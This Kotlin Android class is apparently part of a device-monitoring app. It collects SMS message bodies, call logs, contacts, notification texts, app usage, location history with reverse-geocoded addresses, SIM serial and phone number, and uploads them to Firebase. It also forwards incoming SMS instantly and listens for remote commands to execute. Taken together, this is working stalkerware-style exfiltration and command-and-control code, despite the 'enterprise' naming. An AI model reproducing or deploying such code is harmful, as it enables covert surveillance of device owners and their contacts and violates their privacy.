package com.example.data.sync

import android.app.ActivityManager
import android.content.Context
import android.location.Geocoder
import android.os.Build
import android.provider.Settings
import android.util.Log
import com.example.data.local.AppDatabase
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class FirebaseSyncEngine(private val context: Context) {

    private val db = AppDatabase.getInstance(context)
    val deviceId: String by lazy {
        try {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
        } catch (_: Exception) {
            "DEVICE_${Build.MODEL}"
        }
    }

    private fun formatTimestamp(timestampMs: Long): String {
        return try {
            val sdf = SimpleDateFormat("MMM dd, yyyy, HH:mm", Locale.US)
            sdf.format(Date(timestampMs))
        } catch (_: Exception) {
            ""
        }
    }

    private fun formatDuration(durationSeconds: Long): String {
        val mins = durationSeconds / 60
        val secs = durationSeconds % 60
        return if (mins > 0) "${mins}m ${secs}s" else "${secs}s"
    }

    private fun formatAppTime(totalMs: Long): String {
        val mins = totalMs / (1000 * 60)
        val hrs = mins / 60
        val remMins = mins % 60
        return if (hrs > 0) "${hrs}h ${remMins}m" else "${remMins}m"
    }

    private fun getAddressDetails(lat: Double, lng: Double): Map<String, String> {
        if (lat == 0.0 && lng == 0.0) {
            return mapOf(
                "address" to "No Location Fix",
                "city" to "N/A",
                "state" to "N/A",
                "country" to "N/A",
                "postalCode" to "N/A"
            )
        }
        return try {
            val geocoder = Geocoder(context, Locale.getDefault())
            @Suppress("DEPRECATION")
            val addresses = geocoder.getFromLocation(lat, lng, 1)
            if (!addresses.isNullOrEmpty()) {
                val addr = addresses.first()
                mapOf(
                    "address" to (addr.getAddressLine(0) ?: "$lat, $lng"),
                    "city" to (addr.locality ?: addr.subAdminArea ?: ""),
                    "state" to (addr.adminArea ?: ""),
                    "country" to (addr.countryName ?: ""),
                    "postalCode" to (addr.postalCode ?: "")
                )
            } else {
                mapOf(
                    "address" to "$lat, $lng",
                    "city" to "",
                    "state" to "",
                    "country" to "",
                    "postalCode" to ""
                )
            }
        } catch (_: Exception) {
            mapOf(
                "address" to "$lat, $lng",
                "city" to "",
                "state" to "",
                "country" to "",
                "postalCode" to ""
            )
        }
    }

    private fun getRamUsageFormatted(): String {
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            am?.getMemoryInfo(memInfo)
            if (memInfo != null) {
                val availGb = memInfo.availMem / (1024.0 * 1024.0 * 1024.0)
                val totalGb = memInfo.totalMem / (1024.0 * 1024.0 * 1024.0)
                String.format(Locale.US, "%.1f GB / %.1f GB", availGb, totalGb)
            } else {
                "N/A"
            }
        } catch (_: Exception) {
            "N/A"
        }
    }

    suspend fun clearAllRemoteData(): Boolean = withContext(Dispatchers.IO) {
        var success = true
        try {
            val rtdb = FirebaseDatabase.getInstance()
            rtdb.getReference("devices/$deviceId/sms").removeValue()
            rtdb.getReference("devices/$deviceId/calls").removeValue()
            rtdb.getReference("devices/$deviceId/contacts").removeValue()
            rtdb.getReference("devices/$deviceId/notifications").removeValue()
            rtdb.getReference("devices/$deviceId/app_usage").removeValue()
            rtdb.getReference("devices/$deviceId/location").removeValue()
            Log.d("FirebaseSyncEngine", "Successfully cleared Realtime Database for $deviceId")
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Error clearing RTDB: ${e.message}")
            success = false
        }

        try {
            val firestore = FirebaseFirestore.getInstance()
            val deviceRef = firestore.collection("enterprise_devices").document(deviceId)
            val collections = listOf("sms_logs", "call_logs", "contacts", "notifications", "app_usage", "locations")
            collections.forEach { col ->
                deviceRef.collection(col).get().addOnSuccessListener { snapshot ->
                    snapshot.documents.forEach { doc -> doc.reference.delete() }
                }
            }
            Log.d("FirebaseSyncEngine", "Successfully cleared Firestore subcollections for $deviceId")
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Error clearing Firestore: ${e.message}")
        }

        try {
            db.smsDao().clearAll()
            db.callLogDao().clearAll()
            db.contactDao().clearAll()
            db.notificationDao().clearAll()
            db.appUsageDao().clearAll()
            db.locationDao().clearAll()
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Error clearing local DB: ${e.message}")
        }

        success
    }

    suspend fun pushTelemetryToFirebase(clearFirst: Boolean = false): Boolean = withContext(Dispatchers.IO) {
        if (clearFirst) {
            clearAllRemoteData()
        }

        var firestoreSuccess = false
        var rtdbSuccess = false

        // Fetch all local synced records from Room DB
        val smsList = try { db.smsDao().getAllSmsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading SMS: ${e.message}"); emptyList() }
        val callLogs = try { db.callLogDao().getAllCallLogsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Calls: ${e.message}"); emptyList() }
        val contacts = try { db.contactDao().getAllContactsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Contacts: ${e.message}"); emptyList() }
        val notifications = try { db.notificationDao().getAllNotificationsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Notifications: ${e.message}"); emptyList() }
        val appUsage = try { db.appUsageDao().getAllAppUsageSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Usage: ${e.message}"); emptyList() }
        val locationList = try { db.locationDao().getAllLocationsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Locations: ${e.message}"); emptyList() }
        val deviceInfo = try { DeviceInfoSyncManager(context).collectAndSyncDeviceInfo() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading DeviceInfo: ${e.message}"); null }
        val location = try { LocationSyncManager(context).captureAndSyncLocation() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Location: ${e.message}"); null }

        val timestamp = System.currentTimeMillis()

        // Real SIM & Device payload
        val primarySimMap = mapOf(
            "operatorName" to (deviceInfo?.carrierName ?: "N/A"),
            "countryIso" to (deviceInfo?.countryIso ?: "N/A"),
            "simSerialNumber" to (deviceInfo?.iccid ?: "N/A"),
            "subscriberId" to (deviceInfo?.mccMnc ?: "N/A"),
            "isActive" to (deviceInfo?.simState?.contains("Ready", ignoreCase = true) == true),
            "phoneNumber" to (deviceInfo?.phoneNumber ?: "N/A"),
            "dataRoaming" to (deviceInfo?.isRoaming ?: false),
            "networkType" to (deviceInfo?.networkType ?: "N/A"),
            "dataState" to (deviceInfo?.dataState ?: "N/A")
        )

        val simSlotsMap = mapOf(
            "0" to primarySimMap
        )

        val simInfoMap = mapOf(
            "simCount" to 1,
            "isMultiSim" to false,
            "primarySim" to primarySimMap,
            "simSlots" to simSlotsMap
        )

        val freeStorageGb = (deviceInfo?.freeStorageMb ?: 0) / 1024.0
        val totalStorageGb = (deviceInfo?.totalStorageMb ?: 0) / 1024.0
        val storageFormatted = if (totalStorageGb > 0) {
            String.format(Locale.US, "%.1f GB free of %.1f GB", freeStorageGb, totalStorageGb)
        } else "N/A"

        val deviceInfoPayload = mapOf(
            "model" to (Build.MODEL),
            "manufacturer" to (Build.MANUFACTURER),
            "brand" to (Build.BRAND),
            "androidVersion" to (Build.VERSION.RELEASE),
            "batteryLevel" to (deviceInfo?.batteryLevel ?: 0),
            "isCharging" to (deviceInfo?.isCharging ?: false),
            "batteryStatus" to if (deviceInfo?.isCharging == true) "Charging" else "Discharging",
            "networkType" to (deviceInfo?.networkType ?: "N/A"),
            "wifiSsid" to (deviceInfo?.wifiSsid ?: "Not Connected"),
            "storageAvailableFormatted" to storageFormatted,
            "ramAvailableFormatted" to getRamUsageFormatted(),
            "isRooted" to false,
            "simInfo" to simInfoMap,
            "lastSyncTimestamp" to timestamp
        )

        val currentLat = location?.latitude ?: 0.0
        val currentLng = location?.longitude ?: 0.0
        val addressMap = getAddressDetails(currentLat, currentLng)

        val currentLocationPayload = mapOf(
            "latitude" to currentLat,
            "longitude" to currentLng,
            "accuracy" to (location?.accuracy ?: 0.0f),
            "altitude" to (location?.altitude ?: 0.0),
            "bearing" to (location?.bearing ?: 0.0f),
            "speed" to (location?.speed ?: 0.0f),
            "provider" to (location?.provider ?: "N/A"),
            "timestamp" to (location?.timestamp ?: timestamp),
            "formattedTime" to formatTimestamp(location?.timestamp ?: timestamp),
            "address" to (addressMap["address"] ?: "$currentLat, $currentLng"),
            "city" to (addressMap["city"] ?: ""),
            "state" to (addressMap["state"] ?: ""),
            "country" to (addressMap["country"] ?: ""),
            "postalCode" to (addressMap["postalCode"] ?: "")
        )

        // 1. Sync to Firebase Firestore
        try {
            val firestore = FirebaseFirestore.getInstance()
            val deviceRef = firestore.collection("enterprise_devices").document(deviceId)
            deviceRef.set(deviceInfoPayload)

            // Push SMS subcollection
            smsList.forEach { sms ->
                val typeInt = if (sms.type.contains("OUT", ignoreCase = true) || sms.type == "2") 2 else 1
                deviceRef.collection("sms_logs").document(sms.id.toString()).set(
                    mapOf(
                        "id" to sms.id,
                        "address" to sms.address,
                        "body" to sms.messageBody,
                        "date" to sms.timestamp,
                        "formattedDate" to formatTimestamp(sms.timestamp),
                        "type" to typeInt,
                        "read" to false
                    )
                )
            }

            // Push Call Logs subcollection
            callLogs.forEach { call ->
                deviceRef.collection("call_logs").document(call.id.toString()).set(
                    mapOf(
                        "id" to call.id,
                        "number" to call.number,
                        "name" to call.name,
                        "typeString" to call.type,
                        "formattedDate" to formatTimestamp(call.timestamp),
                        "formattedDuration" to formatDuration(call.durationSeconds),
                        "duration" to call.durationSeconds
                    )
                )
            }

            // Push Contacts subcollection
            contacts.forEach { contact ->
                val phones = listOfNotNull(contact.primaryPhone.takeIf { it.isNotBlank() }, contact.secondaryPhone.takeIf { it.isNotBlank() })
                val emails = if (contact.email.isNotBlank()) listOf(contact.email) else emptyList()
                deviceRef.collection("contacts").document(contact.id.toString()).set(
                    mapOf(
                        "id" to contact.id,
                        "name" to contact.displayName,
                        "phoneNumbers" to phones,
                        "emails" to emails,
                        "notes" to "",
                        "starred" to false
                    )
                )
            }

            // Push Notifications subcollection
            notifications.forEach { notif ->
                deviceRef.collection("notifications").document(notif.id.toString()).set(
                    mapOf(
                        "id" to notif.id,
                        "appName" to notif.packageName.substringAfterLast(".").replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.ROOT) else it.toString() },
                        "packageName" to notif.packageName,
                        "title" to notif.title,
                        "text" to notif.text,
                        "formattedTime" to formatTimestamp(notif.timestamp)
                    )
                )
            }

            // Push App Usage subcollection
            appUsage.forEach { usage ->
                deviceRef.collection("app_usage").document(usage.id.toString()).set(
                    mapOf(
                        "id" to usage.id,
                        "appName" to usage.appName,
                        "packageName" to usage.packageName,
                        "formattedTime" to formatAppTime(usage.totalTimeInForegroundMs),
                        "totalTimeInForegroundMs" to usage.totalTimeInForegroundMs,
                        "formattedLastTimeUsed" to formatTimestamp(usage.lastTimeUsed)
                    )
                )
            }

            // Push Location history subcollection
            locationList.forEach { loc ->
                val locAddr = getAddressDetails(loc.latitude, loc.longitude)
                deviceRef.collection("locations").document(loc.id.toString()).set(
                    mapOf(
                        "id" to loc.id,
                        "latitude" to loc.latitude,
                        "longitude" to loc.longitude,
                        "accuracy" to loc.accuracy,
                        "altitude" to loc.altitude,
                        "bearing" to loc.bearing,
                        "speed" to loc.speed,
                        "provider" to loc.provider,
                        "timestamp" to loc.timestamp,
                        "formattedTime" to formatTimestamp(loc.timestamp),
                        "address" to (locAddr["address"] ?: "${loc.latitude}, ${loc.longitude}"),
                        "city" to (locAddr["city"] ?: ""),
                        "state" to (locAddr["state"] ?: ""),
                        "country" to (locAddr["country"] ?: ""),
                        "postalCode" to (locAddr["postalCode"] ?: "")
                    )
                )
            }

            firestoreSuccess = true
            Log.d("FirebaseSyncEngine", "Firestore sync complete for device $deviceId")
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Firestore sync failed: ${e.message}", e)
        }

        // 2. Sync to Firebase Realtime Database
        try {
            val rtdb = FirebaseDatabase.getInstance()

            // Device Info
            rtdb.getReference(FirebaseConstants.getDeviceInfoPath(deviceId)).setValue(deviceInfoPayload)

            // Location Current
            rtdb.getReference(FirebaseConstants.getLocationCurrentPath(deviceId)).setValue(currentLocationPayload)

            // Location History
            val locHistRef = rtdb.getReference("devices/$deviceId/location/history/$timestamp")
            locHistRef.setValue(currentLocationPayload)

            // SMS Messages
            if (smsList.isNotEmpty()) {
                val smsRef = rtdb.getReference(FirebaseConstants.getSmsPath(deviceId))
                smsList.forEach { sms ->
                    val pushId = smsRef.push().key ?: sms.id.toString()
                    val typeInt = if (sms.type.contains("OUT", ignoreCase = true) || sms.type == "2") 2 else 1
                    smsRef.child(pushId).setValue(
                        mapOf(
                            "address" to sms.address,
                            "body" to sms.messageBody,
                            "date" to sms.timestamp,
                            "formattedDate" to formatTimestamp(sms.timestamp),
                            "type" to typeInt,
                            "read" to false
                        )
                    )
                }
            }

            // Call Logs
            if (callLogs.isNotEmpty()) {
                val callsRef = rtdb.getReference(FirebaseConstants.getCallsPath(deviceId))
                callLogs.forEach { call ->
                    val pushId = callsRef.push().key ?: call.id.toString()
                    callsRef.child(pushId).setValue(
                        mapOf(
                            "number" to call.number,
                            "name" to call.name,
                            "typeString" to call.type,
                            "formattedDate" to formatTimestamp(call.timestamp),
                            "formattedDuration" to formatDuration(call.durationSeconds),
                            "duration" to call.durationSeconds
                        )
                    )
                }
            }

            // Contacts
            if (contacts.isNotEmpty()) {
                val contactsRef = rtdb.getReference(FirebaseConstants.getContactsPath(deviceId))
                contacts.forEach { c ->
                    val pushId = contactsRef.push().key ?: c.id.toString()
                    val phones = listOfNotNull(c.primaryPhone.takeIf { it.isNotBlank() }, c.secondaryPhone.takeIf { it.isNotBlank() })
                    val emails = if (c.email.isNotBlank()) listOf(c.email) else emptyList()
                    contactsRef.child(pushId).setValue(
                        mapOf(
                            "name" to c.displayName,
                            "phoneNumbers" to phones,
                            "emails" to emails,
                            "notes" to "",
                            "starred" to false
                        )
                    )
                }
            }

            // Notifications
            if (notifications.isNotEmpty()) {
                val notifRef = rtdb.getReference(FirebaseConstants.getNotificationsPath(deviceId))
                notifications.forEach { n ->
                    val pushId = notifRef.push().key ?: n.id.toString()
                    notifRef.child(pushId).setValue(
                        mapOf(
                            "appName" to n.packageName.substringAfterLast(".").replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.ROOT) else it.toString() },
                            "packageName" to n.packageName,
                            "title" to n.title,
                            "text" to n.text,
                            "formattedTime" to formatTimestamp(n.timestamp)
                        )
                    )
                }
            }

            // App Usage
            if (appUsage.isNotEmpty()) {
                val usageRef = rtdb.getReference(FirebaseConstants.getAppUsagePath(deviceId))
                appUsage.forEach { u ->
                    val pkgKey = u.packageName.replace(".", "_")
                    usageRef.child(pkgKey).setValue(
                        mapOf(
                            "appName" to u.appName,
                            "packageName" to u.packageName,
                            "formattedTime" to formatAppTime(u.totalTimeInForegroundMs),
                            "totalTimeInForegroundMs" to u.totalTimeInForegroundMs,
                            "formattedLastTimeUsed" to formatTimestamp(u.lastTimeUsed)
                        )
                    )
                }
            }

            rtdbSuccess = true
            Log.d("FirebaseSyncEngine", "Realtime Database sync complete for device $deviceId")
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Realtime Database sync failed: ${e.message}", e)
        }

        firestoreSuccess || rtdbSuccess
    }

    fun uploadSingleSmsInstant(address: String, body: String, timestamp: Long) {
        try {
            val rtdb = FirebaseDatabase.getInstance()
            val smsRef = rtdb.getReference(FirebaseConstants.getSmsPath(deviceId)).push()
            val payload = mapOf(
                "address" to address,
                "body" to body,
                "date" to timestamp,
                "formattedDate" to formatTimestamp(timestamp),
                "type" to 1,
                "read" to false
            )
            smsRef.setValue(payload)
            Log.d("FirebaseSyncEngine", "Instant SMS uploaded to Realtime Database for $address")
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Instant SMS upload error: ${e.message}")
        }
    }

    fun startCommandListener(onCommandReceived: (commandId: String, commandType: String, params: Map<String, Any>) -> Unit) {
        try {
            val rtdb = FirebaseDatabase.getInstance()
            val commandsRef = rtdb.getReference(FirebaseConstants.getCommandsPath(deviceId))
            commandsRef.addChildEventListener(object : ChildEventListener {
                override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                    processCommandSnapshot(snapshot, onCommandReceived)
                }

                override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                    processCommandSnapshot(snapshot, onCommandReceived)
                }

                override fun onChildRemoved(snapshot: DataSnapshot) {}
                override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
                override fun onCancelled(error: DatabaseError) {}
            })
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Error starting command listener: ${e.message}")
        }
    }

    private fun processCommandSnapshot(snapshot: DataSnapshot, onCommandReceived: (String, String, Map<String, Any>) -> Unit) {
        try {
            val pushId = snapshot.key ?: return
            val status = snapshot.child("status").getValue(String::class.java) ?: "PENDING"
            if (status.equals("PENDING", ignoreCase = true)) {
                val commandType = snapshot.child("command").getValue(String::class.java)
                    ?: snapshot.child("commandType").getValue(String::class.java) ?: return

                val paramsMap = mutableMapOf<String, Any>()
                snapshot.child("params").children.forEach { child ->
                    child.key?.let { k -> child.value?.let { v -> paramsMap[k] = v } }
                }

                snapshot.ref.child("status").setValue("EXECUTING")
                onCommandReceived(pushId, commandType, paramsMap)
            }
        } catch (e: Exception) {
            Log.e("FirebaseSyncEngine", "Error processing command snapshot: ${e.message}")
        }
    }

    fun updateCommandStatus(pushId: String, status: String, result: String = "") {
        try {
            val rtdb = FirebaseDatabase.getInstance()
            val cmdRef = rtdb.getReference(FirebaseConstants.getCommandsPath(deviceId)).child(pushId)
            cmdRef.child("status").setValue(status)
            if (result.isNotBlank()) {
                cmdRef.child("result").setValue(result)
            }
        } catch (_: Exception) {}
    }
}
